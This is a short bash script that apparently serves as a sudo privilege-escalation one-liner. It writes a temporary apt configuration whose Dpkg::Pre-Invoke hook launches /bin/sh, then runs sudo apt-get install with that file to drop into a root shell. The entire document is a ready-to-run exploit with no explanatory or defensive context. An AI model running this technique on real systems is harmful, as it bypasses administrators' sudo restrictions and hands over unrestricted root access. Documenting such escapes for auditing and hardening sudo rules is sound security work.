#!/bin/bash
TF=$(mktemp);echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF ; sudo apt-get install -c $TF sl
